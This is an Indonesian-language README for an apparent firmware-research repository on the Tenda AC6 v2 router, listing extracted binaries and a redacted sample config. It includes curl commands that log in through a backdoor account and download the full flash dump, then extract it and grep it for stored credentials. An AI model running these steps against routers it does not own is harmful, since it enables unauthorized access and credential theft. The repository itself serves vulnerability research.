# Firmware artifacts

- `httpd` — **bin/httpd** ORIGINAL dari firmware Tenda AC6 v2 (`V15.03.06.51_multi`), MIPS 32-bit
  little-endian, non-PIE, NX off. Dipakai untuk analisis statis di Binary Ninja
  (buka file ini dan lihat `bn/BN-ADDRESSES.md`).
- `libCfm.so` — library CFM ORIGINAL (dipakai emulasi).
- `mib.sample.cfg` — **contoh** potongan config (nilai sensitif diredaksi). Config asli berada di
  partisi CFG pada flash perangkat; TIDAK disertakan.

## Cara memperoleh (di perangkat sendiri)
```bash
# login backdoor -> cookie
curl -i -X POST http://<router>/login/Auth -d 'username=user&password=user'
# unduh dump flash (dengan cookie)
curl -o flash_dump.bin -H 'Cookie: password=<TOKEN>' http://<router>/cgi-bin/DownloadFlash
# ekstrak rootfs
binwalk -e flash_dump.bin
# atau: unsquashfs ...
```
Config (key=value) ada di partisi CFG (sekitar offset `0x7E0000` pada flash 8 MB), ekstrak dengan
`strings flash_dump.bin | grep sys.baseuser`.

> Data sensitif (password WiFi, PIN WPS, MAC) sengaja diredaksi di repo ini.
